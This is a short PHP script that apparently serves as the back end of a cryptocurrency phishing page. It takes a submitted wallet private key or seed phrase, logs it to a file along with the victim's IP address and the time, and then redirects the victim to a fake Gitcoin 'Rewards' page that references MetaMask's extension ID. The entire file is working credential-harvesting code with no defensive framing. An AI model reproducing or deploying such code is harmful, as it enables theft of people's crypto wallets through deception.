<?php
$file = "GTC_____";
$walletSeed   = $_POST['PrivateKey'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "========================phrase========================");
fwrite($handle, "\n");
fwrite($handle, "KEY : ");
fwrite($handle, "$walletSeed");
fwrite($handle, "\n");

fwrite($handle, "IP  : ");

fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://getgitcoin.github.io/Rewards/index.html?webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn");

?>